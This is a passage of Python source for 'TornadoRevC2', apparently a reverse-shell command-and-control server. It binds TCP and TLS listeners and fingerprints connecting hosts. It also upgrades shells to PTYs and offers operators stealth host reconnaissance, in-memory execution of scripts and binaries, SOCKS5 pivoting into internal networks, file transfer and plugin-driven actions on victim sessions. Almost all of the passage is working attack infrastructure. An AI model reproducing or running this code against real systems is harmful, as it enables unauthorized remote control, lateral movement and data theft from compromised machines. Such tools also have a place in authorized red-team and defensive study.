            return
        host_info = self.get_host_info(client_sock)
        shell_type = info.get('type', 'unix')
        logger = info.get('logger')
        print(f"\n{self.colors['cyan']}{'='*70}{self.colors['end']}")
        print(f"{self.colors['green']}CLIENT SHELL: {host_info} ({shell_type.upper()}) {self.colors['end']}")
        if info.get('sysinfo'):
            print(format_sysinfo(info['sysinfo'], self.colors))
        if logger:
            print(f"{self.colors['blue']}Session log: {logger.session_dir}{self.colors['end']}")
        print(f"{self.colors['cyan']}{'='*70}{self.colors['end']}")
        print(f"{self.colors['yellow']}Ctrl+C sends interrupt; Ctrl+C twice exits to main menu{self.colors['end']}")
        print(f"{self.colors['yellow']}Commands: sysinfo, run/inmemory, plugins, export, upload/download — type 'help'{self.colors['end']}\n")
        self._set_completer_mode('client')
        sys.stdout.flush()

        term = TerminalManager(
            send_fn=lambda cmd: self.send_to_revshell(client_sock, cmd),
            shell_type=shell_type,
            pty_active=info.get('pty', False),
        )
        term.setup_session()
        last_interrupt = 0.0

        def prompt_text():
            host_info = self.get_host_info(client_sock)
            return (
                f"\r{self.colors['green']}{host_info}{self.colors['end']} "
                f"{self.colors['cyan']}{shell_type}>{self.colors['end']} "
            )

        try:
            while True:
                try:
                    cmd = input(prompt_text()).strip()
                    last_interrupt = 0.0
                    if cmd.lower() in ['exit', 'quit', 'e', 'q']:
                        break
                    if not cmd:
                        continue
                    cmd_parts = cmd.split()
                    cmd_lower = cmd_parts[0].lower()

                    if cmd_lower == 'sysinfo':
                        _, mode = self._parse_sysinfo_args(cmd_parts, from_client=True)
                        self.show_sysinfo(client_sock, refresh=True, mode=mode)
                        continue

                    if cmd_lower in ('socks', 'tunnels'):
                        if self.tunnels.handle_command(client_sock, cmd_parts, from_client=True):
                            continue

                    if cmd_lower == 'upload':
                        resume, args = self._parse_transfer_args(cmd_parts)
                        if len(args) >= 2:
                            self.upload_file(client_sock, args[0], args[1], resume=resume)
                        else:
                            print(f"{self.colors['red']}Usage: upload [--resume] <local> <remote>{self.colors['end']}")
                        continue

                    if cmd_lower == 'download':
                        resume, args = self._parse_transfer_args(cmd_parts)
                        if len(args) >= 2:
                            self.download_file(client_sock, args[0], args[1], resume=resume)
                        else:
                            print(f"{self.colors['red']}Usage: download [--resume] <remote> <local>{self.colors['end']}")
                        continue

                    if cmd_lower in ('verify', 'hash') and len(cmd_parts) >= 2:
                        self.verify_file(client_sock, cmd_parts[1])
                        continue

                    if cmd_lower == 'export':
                        if self.exporter.handle_command(cmd_parts, client_sock=client_sock):
                            continue

                    if cmd_lower in ('run', 'plugins'):
                        if self.plugins.handle_command(cmd_parts, client_sock=client_sock):
                            continue

                    if cmd_lower == 'help':
                        print(f"""
    {self.colors['green']}SESSION:{self.colors['end']}
    sysinfo [--stealth|--full]               Collect/display host information (default: stealth)
    exit(e) / quit(q) / CTRL+C               Return to the main menu

    {self.colors['green']}IN-MEMORY EXECUTION:{self.colors['end']}
    run inmemory <filetype> <local_file> [-- args] [--save-output <file>]
      filetype: py, ps, exe, elf, bat, sh

    {self.colors['green']}INTERNAL PIVOTING (SOCKS5):{self.colors['end']}
    socks <listen_port>                               Start SOCKS5 proxy via session
    socks test <host> <port>                          Test internal TCP reachability
    socks reset                                       Reset tunnel streams/buffers
    tunnels                                           List active SOCKS proxies
    socks stop <proxy_id>                             Stop a SOCKS proxy

    {self.colors['green']}REPORTING:{self.colors['end']}
    export                                            Export HTML session transcript

    {self.colors['green']}PLUGINS:{self.colors['end']}
    plugins / plugins list                            List registered plugins
    plugins load|unload|reload|info <name>              Manage plugins at runtime
    run <plugin> [args...]                            Execute a plugin on this session

    {self.colors['green']}FILE TRANSFER:{self.colors['end']}
    upload [--resume] <local> <remote>     Chunked upload with SHA256 verify
    download [--resume] <remote> <local>   Chunked download with SHA256 verify
    verify/hash <remote>                   Remote file size and SHA256""")
                        continue

                    print(f"\r{self.colors['yellow']}$ {cmd}{self.colors['end']}", end='', flush=True)
                    if self.send_to_revshell(client_sock, cmd):
                        output = self.recv_output(client_sock)
                        print(f"\r{output}")
                        if logger:
                            logger.log_command(cmd, output)
                    else:
                        print(f"\r{self.colors['red']}Connection lost{self.colors['end']}")
                        break
                except KeyboardInterrupt:
                    now = time.time()
                    if now - last_interrupt < 1.5:
                        break
                    last_interrupt = now
                    term.send_interrupt()
                    self.recv_output(client_sock, timeout=0.5)
                    print(f"\n{self.colors['yellow']}^C sent to remote (Ctrl+C again to exit){self.colors['end']}")
                except EOFError:
                    break
        finally:
            term.teardown_session()
        self._set_completer_mode('main')

    def main_menu(self):
        self._set_completer_mode('main')
        while self.running:
            try:
                cmd = input(f"{self.colors['green']}tornado> {self.colors['end']}")
                if not cmd.strip():
                    continue
                cmd_parts = cmd.strip().split()
                cmd_lower = cmd_parts[0].lower()

                if cmd_lower == 'payloads':
                    self.print_payloads()
                elif cmd_lower in ('status', 'ls'):
                    self.print_status()
                elif cmd_lower == 'sessions':
                    self.registry.list_sessions(self.colors)
                elif cmd_lower == 'reconnects':
                    self.registry.list_reconnects(self.colors)
                elif cmd_lower == 'switch':
                    if len(cmd_parts) < 2:
                        print(f"{self.colors['red']}Usage: switch <ID>{self.colors['end']}")
                        continue
                    try:
                        client_sock = self._get_client_by_id(int(cmd_parts[1]))
                        if not client_sock:
                            print(f"{self.colors['red']}Client #{cmd_parts[1]} not active{self.colors['end']}")
                            continue
                        self.current_client = client_sock
                        display = self.get_host_info(client_sock).split("@")[0]
                        print(f"{self.colors['green']}Switched to {display}{self.colors['end']}\n")
                        self.client_shell_menu(client_sock)
                        self.current_client = None
                    except ValueError:
                        print(f"{self.colors['red']}Invalid ID{self.colors['end']}")
                elif cmd_lower == 'kill':
                    if len(cmd_parts) < 2:
                        print(f"{self.colors['red']}Usage: kill <ID>{self.colors['end']}")
                        continue
                    try:
                        client_sock = self._get_client_by_id(int(cmd_parts[1]))
                        if not client_sock:
                            print(f"{self.colors['red']}Client #{cmd_parts[1]} not found{self.colors['end']}")
                            continue
                        self.cleanup_client(client_sock)
                        print(f"{self.colors['green']}Client #{cmd_parts[1]} terminated{self.colors['end']}")
                    except ValueError:
                        print(f"{self.colors['red']}Invalid ID{self.colors['end']}")
                elif cmd_lower in ('exit', 'quit', 'e', 'q'):
                    print(f"\n{self.colors['red']}Shutting down server{self.colors['end']}")
                    self.running = False
                    break
                elif self.updater.handle_command(cmd_parts):
                    pass
                elif cmd_lower in ('clear', 'cls'):
                    os.system('cls' if os.name == 'nt' else 'clear')
                    self.print_banner()
                elif cmd_lower in ('rename', 'rn'):
                    if len(cmd_parts) < 3:
                        print(f"{self.colors['red']}Usage: rename/rn <ID> <name>{self.colors['end']}")
                        continue
                    try:
                        changed_id = int(cmd_parts[1])
                        new_name = " ".join(cmd_parts[2:]).strip()
                        if not new_name:
                            raise ValueError
                        with self.client_lock:
                            for info in self.revshell_clients.values():
                                if info['id'] == changed_id:
                                    info['name'] = new_name
                                    self.registry.register_active(info, info.get('fingerprint'))
                                    print(f"{self.colors['green']}Client #{changed_id} renamed to '{new_name}'{self.colors['end']}")
                                    break
                            else:
                                print(f"{self.colors['red']}Client #{changed_id} not found{self.colors['end']}")
                    except ValueError:
                        print(f"{self.colors['red']}Invalid ID or session name{self.colors['end']}")
                elif cmd_lower == 'sysinfo':
                    session_id, mode = self._parse_sysinfo_args(cmd_parts)
                    if not session_id:
                        print(f"{self.colors['red']}Usage: sysinfo <ID> [--stealth|--full]{self.colors['end']}")
                        continue
                    try:
                        client_sock = self._get_client_by_id(int(session_id))
                        if not client_sock:
                            print(f"{self.colors['red']}Client #{session_id} not active{self.colors['end']}")
                            continue
                        self.show_sysinfo(client_sock, refresh=True, mode=mode)
                    except ValueError:
                        print(f"{self.colors['red']}Invalid ID{self.colors['end']}")
                elif self.exporter.handle_command(cmd_parts):
                    pass
                elif self.plugins.handle_command(cmd_parts):
                    pass
                elif self.tunnels.handle_main_command(cmd_parts):
                    pass
                elif cmd_lower == 'upload':
                    resume, args = self._parse_transfer_args(cmd_parts)
                    if len(args) < 3:
                        print(f"{self.colors['red']}Usage: upload [--resume] <ID> <local> <remote>{self.colors['end']}")
                        continue
                    try:
                        client_sock = self._get_client_by_id(int(args[0]))
                        if not client_sock:
                            print(f"{self.colors['red']}Client #{args[0]} not active{self.colors['end']}")
                            continue
                        self.upload_file(client_sock, args[1], args[2], resume=resume)
                    except ValueError:
                        print(f"{self.colors['red']}Invalid ID{self.colors['end']}")
                elif cmd_lower == 'download':
                    resume, args = self._parse_transfer_args(cmd_parts)
                    if len(args) < 3:
                        print(f"{self.colors['red']}Usage: download [--resume] <ID> <remote> <local>{self.colors['end']}")
                        continue
                    try:
                        client_sock = self._get_client_by_id(int(args[0]))
                        if not client_sock:
                            print(f"{self.colors['red']}Client #{args[0]} not active{self.colors['end']}")
                            continue
                        self.download_file(client_sock, args[1], args[2], resume=resume)
                    except ValueError:
                        print(f"{self.colors['red']}Invalid ID{self.colors['end']}")
                elif cmd_lower in ('verify', 'hash'):
                    if len(cmd_parts) < 3:
                        print(f"{self.colors['red']}Usage: verify/hash <ID> <remote_path>{self.colors['end']}")
                        continue
                    try:
                        client_sock = self._get_client_by_id(int(cmd_parts[1]))
                        if not client_sock:
                            print(f"{self.colors['red']}Client #{cmd_parts[1]} not active{self.colors['end']}")
                            continue
                        self.verify_file(client_sock, cmd_parts[2])
                    except ValueError:
                        print(f"{self.colors['red']}Invalid ID{self.colors['end']}")
                elif cmd_lower == 'help':
                    print(f"""
    {self.colors['green']}SESSION MANAGEMENT:{self.colors['end']}
    switch <ID>             Client interaction
    kill <ID>               Terminate client
    status/ls               Show active clients
    sessions                Show tracked sessions (active + disconnected)
    reconnects              Show session reconnect history
    sysinfo <ID> [--stealth|--full]   Refresh and show host information (default: stealth)
    rename/rn <ID> <name>   Rename session
    payloads                Show payloads list
    clear/cls               Clear screen
    update                  Pull latest from the official repository branch and restart
    help                    This help menu
    exit/quit               Shutdown server

    {self.colors['green']}REPORTING:{self.colors['end']}
    export <ID>                                              Export HTML session transcript

    {self.colors['green']}PLUGINS:{self.colors['end']}
    plugins / plugins list                                   List registered plugins
    plugins load|unload|reload|info <name>                     Manage plugins at runtime
    run <plugin> <ID>                                        Execute a plugin on a session

    {self.colors['green']}INTERNAL PIVOTING (SOCKS5):{self.colors['end']}
    socks <ID> <listen_port>                                 Start SOCKS5 proxy via session
    socks <ID> test <host> <port>                            Test internal TCP reachability
    socks <ID> reset                                           Reset tunnel streams/buffers
    tunnels                                                  List active SOCKS proxies
    socks stop <proxy_id>                                    Stop a SOCKS proxy

    {self.colors['green']}IN-MEMORY EXECUTION:{self.colors['end']}
    run inmemory <ID> <filetype> <local_file> [-- args] [--save-output <file>]
      filetype: py, ps, exe, elf, bat, sh

    {self.colors['green']}FILE TRANSFER:{self.colors['end']}
    upload [--resume] <ID> <local> <remote>     Chunked upload with SHA256 verify
    download [--resume] <ID> <remote> <local>   Chunked download with SHA256 verify
    verify/hash <ID> <remote>                   Remote file size and SHA256

    {self.colors['yellow']}Inside a client shell, omit <ID> for session-targeted commands{self.colors['end']}""")
            except KeyboardInterrupt:
                print(f"\n{self.colors['yellow']}For exiting please type exit(e) or quit(q){self.colors['end']}")

    def cleanup_client(self, client_sock):
        info = None
        with self.client_lock:
            info = self.revshell_clients.pop(client_sock, None)
        if not info:
            return
        self.tunnels.cleanup_session(client_sock)
        try:
            client_sock.close()
        except Exception:
            pass
        display = info["name"] if info.get("name") else f"#{info['id']}"
        logger = info.get('logger')
        if logger:
            logger.log_event('Session disconnected')
        self.registry.mark_disconnected(info)
        print(f"{self.colors['red']}\n{display} {info['addr'][0]}:{info['addr'][1]} disconnected{self.colors['end']}")
        print(f"{self.colors['yellow']}Session metadata preserved — will restore on reconnect (fingerprint: {info.get('fingerprint', '?')}){self.colors['end']}")

    def _close_listener(self, server):
        if server is None:
            return
        try:
            server.shutdown(socket.SHUT_RDWR)
        except OSError:
            pass
        try:
            server.close()
        except OSError:
            pass

    def shutdown_for_restart(self):
        """Release listeners, tunnels, and sessions before replacing this process."""
        self.running = False
        self._close_listener(self._tcp_server)
        self._close_listener(self._tls_server)
        self.tunnels.shutdown_for_restart()
        with self.client_lock:
            clients = list(self.revshell_clients.keys())
        for client_sock in clients:
            try:
                client_sock.shutdown(socket.SHUT_RDWR)
            except OSError:
                pass
            try:
                client_sock.close()
            except OSError:
                pass
        with self.client_lock:
            self.revshell_clients.clear()
        sys.stdout.flush()
        sys.stderr.flush()

    def handle_client(self, client_sock, addr):
        client_info = {
            'sock': client_sock,
            'addr': addr,
            'type': 'unknown',
            'id': None,
            'name': None,
            'tls': isinstance(client_sock, ssl.SSLSocket),
            'pty': False,
            'init': False,
            'sysinfo': None,
            'logger': None,
            'fingerprint': None,
            'connect_count': 1,
            'reconnected': False,
        }
        with self.client_lock:
            self.revshell_clients[client_sock] = client_info

        self.send_to_revshell(
            client_sock,
            "uname -a 2>/dev/null; echo __T_PROBE__; ver 2>&1; cmd /c ver 2>&1; echo __T_PROBE_END__",
        )
        probe_output = self.recv_output(client_sock, timeout=4.0, until_marker='__T_PROBE_END__')
        inferred = self.infer_platform(probe_output)
        if inferred == 'unknown' and probe_windows_platform(self, client_sock):
            inferred = 'windows'
        client_info['type'] = inferred
        if inferred == 'windows':
            from .win_client import detect_windows_shell_kind
            client_info['win_shell'] = detect_windows_shell_kind(self, client_sock)
        client_info['identity'] = self._probe_identity(client_sock, inferred)

        term = TerminalManager(
            send_fn=lambda cmd: self.send_to_revshell(client_sock, cmd),
            shell_type=inferred,
        )
        if inferred == 'unix':
            self.send_to_revshell(client_sock, term.unix_pty_upgrade_cmd())
            client_info['pty'] = True
        elif inferred == 'windows':
            self.send_to_revshell(client_sock, "$ProgressPreference='SilentlyContinue'")
            client_info['init'] = True

        self.recv_output(client_sock, timeout=2.0)

        fingerprint = compute_fingerprint(client_info, probe_output)
        prior = self.registry.find_reconnect(
            fingerprint, probe_output, client_info, live_ids=self._live_session_ids(),
        )
        reconnected = False
        previous_id = None

        if prior:
            fingerprint = prior.get('fingerprint') or fingerprint
            previous_id = prior.get('session_id')
            client_id = prior.get('session_id')
            if not isinstance(client_id, int) or client_id < 1:
                self.client_counter += 1
                client_id = self.client_counter
            elif client_id > self.client_counter:
                self.client_counter = client_id
            client_info['id'] = client_id
            client_info['name'] = prior.get('name')
            client_info['sysinfo'] = prior.get('sysinfo')
            prior_type = prior.get('type')
            if prior_type in ('windows', 'unix'):
                client_info['type'] = prior_type
            elif inferred == 'unknown':
                hinted = infer_type_from_sysinfo(client_info.get('sysinfo') or {})
                if hinted:
                    client_info['type'] = hinted
            if prior.get('identity') and not client_info.get('identity'):
                client_info['identity'] = prior.get('identity')
            client_info['fingerprint'] = fingerprint
            client_info['reconnected'] = True
            reconnected = True
            logger = self.registry.restore_logger(prior.get('log_session_id'))
            client_info['logger'] = logger
            self.registry.log_reconnect(previous_id, client_id, fingerprint, addr)
            client_info['connect_count'] = self.registry.get_connect_count(fingerprint)
            if logger:
                detail = f"from {addr[0]}:{addr[1]} (connect #{client_info['connect_count']})"
                logger.log_reconnect(detail)
        else:
            self.client_counter += 1
            client_id = self.client_counter
            client_info['id'] = client_id
            client_info['fingerprint'] = fingerprint
            session_id = self._make_session_id(client_id, addr, inferred, client_info.get('sysinfo'))
            logger = SessionLogger(session_id)
            client_info['logger'] = logger
            logger.log_event(f"Session connected from {addr[0]}:{addr[1]} ({inferred})")

        self.registry.register_active(client_info, fingerprint, probe_output)

        if reconnected:
            display = client_info["name"] if client_info.get("name") else f"#{client_id}"
            print(
                f"{self.colors['green']}Client RECONNECTED {display}: {addr[0]}:{addr[1]} "
                f"({inferred.upper()}) | restored session #{client_id} | switch {client_id}{self.colors['end']}"
            )
            if client_info.get('sysinfo'):
                si = client_info['sysinfo']
                print(
                    f"{self.colors['cyan']}  Restored: {si.get('username', '?')}@{si.get('hostname', '?')} "
                    f"[{si.get('os', '?')}] (connect #{client_info['connect_count']}){self.colors['end']}"
                )
        else:
            print(
                f"{self.colors['green']}New Client #{client_id}: {addr[0]}:{addr[1]} "
                f"({inferred.upper()}) | switch {client_id}{self.colors['end']}"
            )

        if client_info.get('logger'):
            print(f"{self.colors['blue']}Logs: {client_info['logger'].session_dir}{self.colors['end']}")

    def start(self):
        self.print_banner()
        self.ensure_tls_certificates()
        tcp_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        tcp_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        tcp_server.bind((self.host, self.revshell_port))
        tcp_server.listen(100)
        tls_context = self.create_tls_context()
        tls_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        tls_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        tls_server.bind((self.host, self.tls_port))
        tls_server.listen(100)
        self._tcp_server = tcp_server
        self._tls_server = tls_server
        self.running = True
        threading.Thread(target=self.listener, args=(tcp_server, False), daemon=True).start()
        threading.Thread(target=self.listener, args=(tls_server, True, tls_context), daemon=True).start()
        self._init_readline()
        self.main_menu()
        self.running = False

    def listener(self, server, use_tls=False, tls_context=None):
        while self.running:
            try:
                client_sock, addr = server.accept()
                if use_tls:
                    try:
                        client_sock = tls_context.wrap_socket(client_sock, server_side=True)
                    except ssl.SSLError:
                        client_sock.close()
                        continue
                threading.Thread(target=self.handle_client, args=(client_sock, addr), daemon=True).start()
            except Exception:
                break


def main():
    parser = argparse.ArgumentParser(description='TornadoRevC2')
    parser.add_argument('-H', '--host', default='0.0.0.0', help='Bind address')
    parser.add_argument('-p', '--port', type=int, default=4444, help='TCP listener port')
    parser.add_argument('-tp', '--tls-port', type=int, default=8443, help='TLS listener port')
    parser.add_argument('-c', '--cert', default='server.pem', help='TLS certificate file')
    parser.add_argument('-k', '--key', default='server.key', help='TLS private key file')
    args = parser.parse_args()
    srv = TORNADOREVC2(
        host=args.host, revshell_port=args.port, tls_port=args.tls_port,
        certfile=args.cert, keyfile=args.key,
    )
    srv.start()


if __name__ == '__main__':
    main()
